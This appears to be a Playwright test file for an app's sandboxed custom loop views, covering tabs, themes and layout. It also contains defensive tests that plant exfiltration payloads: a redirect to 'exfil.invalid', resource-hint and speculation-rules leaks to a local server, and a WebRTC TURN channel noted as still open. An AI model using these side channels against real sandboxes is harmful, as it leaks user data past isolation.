import { type Server, createServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import type { Page } from '@playwright/test'
import { expect, test } from '../fixtures/auth.fixture'
import { SHIP_GATE_VIEWPORTS } from '../helpers/viewports'

/**
 * The agent-built custom view on the loop page.
 *
 * Dark mode goes through the app's own maskin-theme key: the app defaults to light and
 * ignores prefers-color-scheme unless the stored theme is "system".
 *
 * The view declares one loop-scoped source and writes the count into the page, so a
 * number on screen proves the whole path: pinned file -> sandboxed frame -> bridge ->
 * GET /api/data/query against the real database. The aggregation SQL itself is covered
 * against real Postgres in apps/dev's data-query integration test.
 */
const FRAME = 'iframe[title="Custom loop view"]'

// The view runs in a frame inside the frame the page renders (the isolation frame).
const viewFrame = (page: Page) => page.frameLocator(FRAME).frameLocator('iframe')

async function setTheme(page: Page, theme: 'light' | 'dark') {
	await page.addInitScript((t) => localStorage.setItem('maskin-theme', t), theme)
}

/** Opens a tab by name; at narrow widths it may be folded under "More". */
async function openTab(page: Page, name: string) {
	await expect(page.getByRole('tablist', { name: 'Flow sections' })).toBeVisible({
		timeout: 15_000,
	})
	const tab = page.getByRole('tab', { name, exact: true })
	if ((await tab.count()) > 0) {
		await tab.click()
		return
	}
	await page.getByRole('button', { name: /^More/ }).click()
	await page.getByRole('menuitemradio', { name, exact: true }).click()
}

function viewHtml(loopId: string) {
	return `<!doctype html><html><body>
<h1 id="outcome">Close the feedback backlog</h1>
<p id="headline">Loading</p>
<script id="maskin-sources" type="application/json">{"done":{"scope":"${loopId}","type":"task","filters":{"status":"done"}}}</script>
<script>maskin.query("done").then(function (r) { document.getElementById("headline").textContent = r.total.count + " tasks done" }).catch(function (e) { document.getElementById("headline").textContent = "Could not load: " + e.message })</script>
</body></html>`
}

async function seedLoopWithView(account: {
	workspaceId: string
	api: import('../helpers/api.helper').TestAPI
}) {
	const loop = await account.api.createObject(account.workspaceId, {
		type: 'loop',
		title: 'Feedback loop',
		status: 'learning',
	})
	// Two done tasks in the loop, one not done, and one done task outside it: the
	// view must say 2, so scope and the status filter are both exercised.
	for (const [title, status, inLoop] of [
		['Done in loop A', 'done', true],
		['Done in loop B', 'done', true],
		['Open in loop', 'todo', true],
		['Done elsewhere', 'done', false],
	] as const) {
		const task = await account.api.createObject(account.workspaceId, {
			type: 'task',
			title,
			status: 'todo',
		})
		// A task cannot be created as done; move it there after.
		if (status === 'done') {
			await account.api.updateObject(task.id, account.workspaceId, { status })
		}
		if (inLoop) {
			await account.api.createRelationship(account.workspaceId, {
				source_type: 'object',
				source_id: loop.id,
				target_type: 'object',
				target_id: task.id,
				type: 'in_loop',
			})
		}
	}
	const file = await account.api.createFile(account.workspaceId, {
		name: 'loop-view.html',
		mime_type: 'text/html',
		content: viewHtml(loop.id),
	})
	await account.api.updateObject(loop.id, account.workspaceId, {
		metadata: { view_file_id: file.id },
	})
	return { loop, file }
}

test.describe('Loop page — custom view tabs', () => {
	for (const vp of SHIP_GATE_VIEWPORTS) {
		test(`the pinned view is its own tab with live numbers @ ${vp.label}`, async ({
			page,
			account,
		}) => {
			await page.setViewportSize({ width: vp.width, height: vp.height })
			// seedLoopWithView pins through the legacy view_file_id: one tab named Custom view.
			const { loop } = await seedLoopWithView(account)

			await page.goto(`/${account.workspaceId}/loops/${loop.id}`)

			// Overview is the default page and carries no view or switch.
			const frame = page.locator(FRAME)
			await expect(page.getByRole('heading', { name: 'Pipeline' })).toBeVisible({
				timeout: 15_000,
			})
			await expect(frame).toHaveCount(0)
			await expect(page.getByLabel('Loop view', { exact: true })).toHaveCount(0)

			await openTab(page, 'Custom view')
			await expect(frame).toBeVisible({ timeout: 15_000 })
			// Scripts only: no same-origin access to the app's session or storage.
			await expect(frame).toHaveAttribute('sandbox', 'allow-scripts')
			const inner = viewFrame(page)
			await expect(inner.getByText('Close the feedback backlog')).toBeVisible()
			await expect(inner.getByText('2 tasks done')).toBeVisible({ timeout: 15_000 })

			// Back to Overview and into the view again.
			await openTab(page, 'Overview')
			await expect(frame).toHaveCount(0)
			await openTab(page, 'Custom view')
			await expect(frame).toBeVisible()
			await expect(viewFrame(page).getByText('2 tasks done')).toBeVisible({
				timeout: 15_000,
			})

			// The page itself never scrolls sideways.
			const overflow = await page.evaluate(
				() => document.documentElement.scrollWidth - document.documentElement.clientWidth,
			)
			expect(overflow).toBeLessThanOrEqual(0)
		})
	}

	test('two views give two tabs between Overview and Items, in order', async ({
		page,
		account,
	}) => {
		await page.setViewportSize({ width: 1280, height: 800 })
		const { loop } = await seedLoopWithView(account)
		const second = await account.api.createFile(account.workspaceId, {
			name: 'second-view.html',
			mime_type: 'text/html',
			content: viewHtml(loop.id).replace('Close the feedback backlog', 'Second view heading'),
		})
		const first = await account.api.createFile(account.workspaceId, {
			name: 'first-view.html',
			mime_type: 'text/html',
			content: viewHtml(loop.id),
		})
		await account.api.updateObject(loop.id, account.workspaceId, {
			metadata: {
				views: [
					{ name: 'Results', file_id: first.id },
					{ name: 'Pipeline view', file_id: second.id },
				],
			},
		})

		await page.goto(`/${account.workspaceId}/loops/${loop.id}`)

		await expect(page.getByRole('tab', { name: 'Setup' })).toBeVisible({ timeout: 15_000 })
		expect(await page.getByRole('tab').allTextContents()).toEqual([
			'Overview',
			'Results',
			'Pipeline view',
			'Items',
			'Activity',
			'Setup',
		])

		await openTab(page, 'Pipeline view')
		await expect(viewFrame(page).getByText('Second view heading')).toBeVisible({
			timeout: 15_000,
		})
		await openTab(page, 'Results')
		await expect(viewFrame(page).getByText('Close the feedback backlog')).toBeVisible({
			timeout: 15_000,
		})
	})

	for (const vp of SHIP_GATE_VIEWPORTS) {
		test(`a wide view scrolls inside its own box and Overview keeps its triggers @ ${vp.label}`, async ({
			page,
			account,
		}) => {
			await page.setViewportSize({ width: vp.width, height: vp.height })
			const agent = await account.api.createAgentActor('Relay')
			await account.api.addWorkspaceMember(account.workspaceId, agent.id)
			const loop = await account.api.createObject(account.workspaceId, {
				type: 'loop',
				title: 'Wide view loop',
				status: 'learning',
			})
			const trigger = await account.api.createTrigger(account.workspaceId, {
				name: 'Triage feedback',
				type: 'event',
				action_prompt: 'Normalises the event into the shared source',
				target_actor_id: agent.id,
				config: { entity_type: 'object', action: 'created' },
			})
			const file = await account.api.createFile(account.workspaceId, {
				name: 'wide-view.html',
				mime_type: 'text/html',
				content:
					'<!doctype html><html><body style="margin:0"><h1 id="t">Wide view</h1><div style="width:1600px;height:24px;background:#2545c8"></div><p id="n">Loading</p><script id="maskin-sources" type="application/json">{"all":{"type":"task"}}</script><script>maskin.query("all").then(function (r) { document.getElementById("n").textContent = r.total.count + " tasks" })</script></body></html>',
			})
			await account.api.updateObject(loop.id, account.workspaceId, {
				metadata: { trigger_ids: [trigger.id], view_file_id: file.id },
			})

			await page.goto(`/${account.workspaceId}/loops/${loop.id}`)

			// Overview keeps the triggers; the view sits in its own tab, inside its own box.
			const frame = page.locator(FRAME)
			await expect(page.getByText('Triage feedback', { exact: true })).toBeVisible({
				timeout: 15_000,
			})
			await expect(frame).toHaveCount(0)
			await openTab(page, 'Custom view')
			await expect(frame).toBeVisible({ timeout: 15_000 })
			await expect
				.poll(() =>
					frame.evaluate((el) => {
						for (let box = el.parentElement; box; box = box.parentElement) {
							if (
								getComputedStyle(box).overflowX === 'auto' ||
								getComputedStyle(box).overflowX === 'scroll'
							)
								return box.scrollWidth > box.clientWidth
						}
						return false
					}),
				)
				.toBe(true)
			const overflow = () =>
				page.evaluate(
					() => document.documentElement.scrollWidth - document.documentElement.clientWidth,
				)
			expect(await overflow()).toBeLessThanOrEqual(0)

			// Overview brings back the triggers section.
			await openTab(page, 'Overview')
			await expect(frame).toHaveCount(0)
			await expect(page.getByRole('heading', { name: 'Pipeline' })).toBeVisible()
			await expect(page.getByText('Triage feedback', { exact: true })).toBeVisible()
			expect(await overflow()).toBeLessThanOrEqual(0)
		})
	}

	test('a view that reads its data and then navigates away cannot reach another site', async ({
		page,
		account,
	}) => {
		// The isolation frame's frame-src 'none' blocks a frame navigating itself. Verified in
		// Chrome only, which is what this suite runs. Resource hints have their own describe
		// below.
		const requested: string[] = []
		await page.route('https://exfil.invalid/**', (route) => {
			requested.push(route.request().url())
			return route.abort()
		})
		const { loop, file } = await seedLoopWithView(account)
		await account.api.updateFile(account.workspaceId, file.id, {
			content: viewHtml(loop.id).replace(
				'document.getElementById("headline").textContent = r.total.count + " tasks done" }',
				'document.getElementById("headline").textContent = r.total.count + " tasks done"; location = "https://exfil.invalid/?d=" + r.total.count }',
			),
		})

		await page.goto(`/${account.workspaceId}/loops/${loop.id}`)
		await openTab(page, 'Custom view')

		// A view that keeps navigating is reset a few times, then dropped with a note in its tab.
		await expect(page.getByText(/This view can't be shown/)).toBeVisible({ timeout: 30_000 })
		await expect(page.locator(FRAME)).toHaveCount(0)
		expect(requested).toEqual([])
	})

	for (const theme of ['light', 'dark'] as const) {
		test(`the frame is visible in ${theme} mode`, async ({ page, account }) => {
			await setTheme(page, theme)
			const { loop } = await seedLoopWithView(account)

			await page.goto(`/${account.workspaceId}/loops/${loop.id}`)
			await openTab(page, 'Custom view')

			await expect(page.locator(FRAME)).toBeVisible({ timeout: 15_000 })
			await expect(viewFrame(page).getByText('2 tasks done')).toBeVisible({
				timeout: 15_000,
			})
		})
	}

	test('no view pinned: no extra tab and no frame', async ({ page, account }) => {
		await page.setViewportSize({ width: 1280, height: 800 })
		const loop = await account.api.createObject(account.workspaceId, {
			type: 'loop',
			title: 'Plain loop',
			status: 'learning',
		})

		await page.goto(`/${account.workspaceId}/loops/${loop.id}`)

		await expect(page.getByRole('heading', { name: 'Plain loop' })).toBeVisible({
			timeout: 15_000,
		})
		expect(await page.getByRole('tab').allTextContents()).toEqual([
			'Overview',
			'Items',
			'Activity',
			'Setup',
		])
		await expect(page.locator(FRAME)).toHaveCount(0)
	})

	test('view file is not HTML: its tab says so and Overview is untouched', async ({
		page,
		account,
	}) => {
		const loop = await account.api.createObject(account.workspaceId, {
			type: 'loop',
			title: 'Broken view loop',
			status: 'learning',
		})
		const file = await account.api.createFile(account.workspaceId, {
			name: 'notes.txt',
			mime_type: 'text/plain',
			content: 'not a view',
		})
		await account.api.updateObject(loop.id, account.workspaceId, {
			metadata: { view_file_id: file.id },
		})

		await page.goto(`/${account.workspaceId}/loops/${loop.id}`)

		await openTab(page, 'Custom view')
		await expect(page.getByText(/This view can't be shown/)).toBeVisible({ timeout: 15_000 })
		await expect(page.locator(FRAME)).toHaveCount(0)
		await openTab(page, 'Overview')
		await expect(page.getByRole('heading', { name: 'Pipeline' })).toBeVisible()
	})
})

/**
 * Resource hints and other side channels a view's script could use to send what it read
 * through the bridge to another address. Each test serves two local servers: a control one
 * the host page hints at itself, and a leak one only the view hints at. The control proves
 * this Chrome fires that kind of hint at all; when it does not (prerender, preconnect and
 * DNS prefetch do not fire in headless Chrome), a quiet leak server proves nothing, so the
 * test skips and says so. Other browsers are not run by this suite.
 */
type Counter = { requests: string[]; connections: number; url: string; close: () => void }

async function startCounter(): Promise<Counter> {
	const counter = { requests: [] as string[], connections: 0, url: '', close: () => {} }
	const server: Server = createServer((req, res) => {
		counter.requests.push(req.url ?? '')
		res.setHeader('content-type', 'text/html')
		res.end('<html></html>')
	})
	server.on('connection', () => {
		counter.connections += 1
	})
	await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
	counter.url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
	counter.close = () => {
		server.closeAllConnections()
		server.close()
	}
	return counter
}

const seen = (c: Counter) => c.requests.length > 0 || c.connections > 0

type Hint = {
	name: string
	/** The element this hint is made of, given the address it points at. */
	make: (
		url: string,
	) => { tag: 'link'; rel: string; href: string } | { tag: 'script'; rules: object }
}

const HINTS: Hint[] = [
	{ name: 'link rel=prefetch', make: (u) => ({ tag: 'link', rel: 'prefetch', href: u }) },
	{ name: 'link rel=prerender', make: (u) => ({ tag: 'link', rel: 'prerender', href: u }) },
	{ name: 'link rel=preconnect', make: (u) => ({ tag: 'link', rel: 'preconnect', href: u }) },
	{
		name: 'speculationrules prefetch',
		make: (u) => ({ tag: 'script', rules: { prefetch: [{ source: 'list', urls: [u] }] } }),
	},
	{
		name: 'speculationrules prerender',
		make: (u) => ({ tag: 'script', rules: { prerender: [{ source: 'list', urls: [u] }] } }),
	},
]

/** Markup for a hint written straight into the view HTML. */
function staticMarkup(hint: ReturnType<Hint['make']>) {
	return hint.tag === 'link'
		? `<link rel="${hint.rel}" href="${hint.href}">`
		: `<script type="speculationrules">${JSON.stringify(hint.rules)}</script>`
}

/** Script that adds the hint to the document at run time, after the view has read its data. */
function dynamicScript(hint: ReturnType<Hint['make']>) {
	return hint.tag === 'link'
		? `var e=document.createElement("link");e.rel=${JSON.stringify(hint.rel)};e.href=${JSON.stringify(hint.href)};document.head.appendChild(e)`
		: `var e=document.createElement("script");e.type="speculationrules";e.textContent=${JSON.stringify(JSON.stringify(hint.rules))};document.head.appendChild(e)`
}

function hintViewHtml(loopId: string, body: string, script: string) {
	return `<!doctype html><html><head></head><body>${body}<p id="ready">ready</p>
<script id="maskin-sources" type="application/json">{"done":{"scope":"${loopId}","type":"task","filters":{"status":"done"}}}</script>
<script>maskin.query("done").then(function (r) { ${script} }).catch(function () {})</script>
</body></html>`
}

test.describe('Loop page — custom view side channels', () => {
	for (const hint of HINTS) {
		for (const how of ['static tag', 'script-created tag'] as const) {
			test(`${hint.name} (${how}) does not reach another address`, async ({ page, account }) => {
				const control = await startCounter()
				const leak = await startCounter()
				try {
					const { loop, file } = await seedLoopWithView(account)
					// The address carries what the view read, as a real exfiltration would.
					const body =
						how === 'static tag' ? staticMarkup(hint.make(`${leak.url}/leak?d=static`)) : ''
					const script =
						how === 'script-created tag'
							? dynamicScript(hint.make(`${leak.url}/leak?d=__D__`)).replace(
									'__D__',
									'"+r.total.count+"',
								)
							: ''
					await account.api.updateFile(account.workspaceId, file.id, {
						content: hintViewHtml(loop.id, body, script),
					})

					await page.goto(`/${account.workspaceId}/loops/${loop.id}`)
					await openTab(page, 'Custom view')
					await expect(viewFrame(page).locator('#ready')).toBeVisible({ timeout: 15_000 })

					// Control: the same hint, made by the host page, must be seen by the control server.
					await page.evaluate(
						([h, url]) => {
							const spec = JSON.parse(h as string)
							const e = document.createElement(spec.tag) as HTMLLinkElement & HTMLScriptElement
							if (spec.tag === 'link') {
								e.rel = spec.rel
								e.href = url as string
							} else {
								e.type = 'speculationrules'
								e.textContent = JSON.stringify(spec.rules)
							}
							document.head.appendChild(e)
						},
						[JSON.stringify(hint.make(`${control.url}/control`)), `${control.url}/control`],
					)
					await expect
						.poll(() => seen(control), { timeout: 5_000 })
						.toBe(true)
						.catch(() => {})
					test.skip(
						!seen(control),
						`Chrome here does not fire ${hint.name} from a top-level page, so a quiet server proves nothing`,
					)

					await page.waitForTimeout(3_000)
					expect(leak.requests).toEqual([])
					expect(leak.connections).toBe(0)
				} finally {
					control.close()
					leak.close()
				}
			})
		}
	}

	// Known open (verified by hand in Chrome 147): RTCPeerConnection with a turn: url opens a
	// connection to an address of the view's choosing, and no header, CSP rule or sandbox flag
	// closes it. Kept as fixme so the wanted assertion is written down for when a close exists.
	test.fixme(
		'WebRTC (RTCPeerConnection with an iceServers url) does not reach another address',
		async ({ page, account }) => {
			const leak = await startCounter()
			try {
				const { loop, file } = await seedLoopWithView(account)
				const port = new URL(leak.url).port
				await account.api.updateFile(account.workspaceId, file.id, {
					content: hintViewHtml(
						loop.id,
						'',
						`var p=new RTCPeerConnection({iceServers:[{urls:"turn:127.0.0.1:${port}?transport=tcp",username:"d"+r.total.count,credential:"x"}],iceTransportPolicy:"relay"});p.createDataChannel("x");p.createOffer().then(function(o){return p.setLocalDescription(o)})`,
					),
				})
				await page.goto(`/${account.workspaceId}/loops/${loop.id}`)
				await openTab(page, 'Custom view')
				await expect(viewFrame(page).locator('#ready')).toBeVisible({ timeout: 15_000 })
				await page.waitForTimeout(3_000)
				expect(leak.connections).toBe(0)
			} finally {
				leak.close()
			}
		},
	)
})
